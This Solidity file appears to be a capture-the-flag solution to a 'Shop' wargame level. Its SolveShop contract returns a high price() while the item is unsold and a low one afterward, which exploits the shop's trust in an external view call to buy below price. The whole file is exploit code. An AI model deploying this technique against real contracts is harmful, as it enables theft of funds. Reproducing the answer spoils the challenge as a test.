// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { IBuyer } from "./Shop.sol";

interface IShop {
    function buy() external;
    function isSold() external view returns (bool);
}

contract SolveShop is IBuyer {
    // storage
    uint256 immutable refPrice;

    constructor(uint256 _refPrice) {
        refPrice = _refPrice;
    }

    function price() external view returns (uint256) {
        IShop shop = IShop(msg.sender);

        if (!shop.isSold()) {
            return refPrice + 20;
        } else {
            return refPrice - 20;
        }
    }

    function buy(address shopAddr) external {
        IShop shop = IShop(shopAddr);
        shop.buy();
    }
}
